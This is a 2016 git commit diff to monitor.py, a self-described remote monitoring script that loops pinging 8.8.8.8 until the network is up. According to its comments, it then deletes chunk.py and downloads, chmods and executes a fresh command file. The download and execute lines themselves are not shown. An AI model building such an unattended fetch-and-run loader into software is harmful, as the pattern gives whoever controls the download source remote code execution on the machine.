0849e50402f7295c35fea01cba785833a2b313ef
Vasily122 <vasily122@yandex.ru>
2016-01-19 09:43:00 +0300

    change  sleep order and period before fokr

--- monitor.py
+++ monitor.py
@@ -5,16 +5,16 @@
 #load external module chunk.py, chmod it to a+x and execute
 #monitor.py is for remote monitoring server\workstation
 #Author: vasily122@yandex.ru
-#Date: 2015 dec 7
-#Version: 0.3
+#Date: 2016 jan 19
+#Version: 0.4
 #====================================
 import time,os
 chanel=0
 while chanel==0:
-	time.sleep(300)
 	b=os.popen("ping 8.8.8.8 -c1 |grep icmp_seq=").read()
 	if(b[23:32] =="icmp_seq="):
 		chanel=1
+	time.sleep(100)
 # remove old chunk.py, if exist
 os.system("rm chunk.py")
 # to download new command file, make it executable and if ok- snart it
